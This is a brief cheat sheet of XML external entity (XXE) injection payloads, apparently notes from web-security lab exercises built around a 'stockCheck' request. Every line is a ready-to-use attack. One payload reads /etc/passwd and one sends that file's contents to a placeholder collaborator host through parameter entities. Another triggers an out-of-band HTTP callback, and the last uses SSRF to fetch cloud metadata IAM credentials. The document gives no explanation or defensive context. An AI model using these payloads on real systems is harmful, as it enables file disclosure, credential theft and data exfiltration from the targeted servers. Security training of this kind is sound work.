## retrieve data
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> <stockCheck><productId>&xxe;</productId></stockCheck>`

`<!DOCTYPE foo [ <!ENTITY % file SYSTEM "file:///etc/passwd"> <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-COLLABORATOR?x=%file;'>"> %eval; %exfiltrate;  ]> `

## http request with data extrafiltration
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR"> %xxe;]> <stockCheck><productId>1</productId><storeId>2</storeId></stockCheck>`

## server side request forgery via xxe
`<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE aora [<!ENTITY xxe SYSTEM "http://TARGET/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId> 1</storeId></stockCheck>`
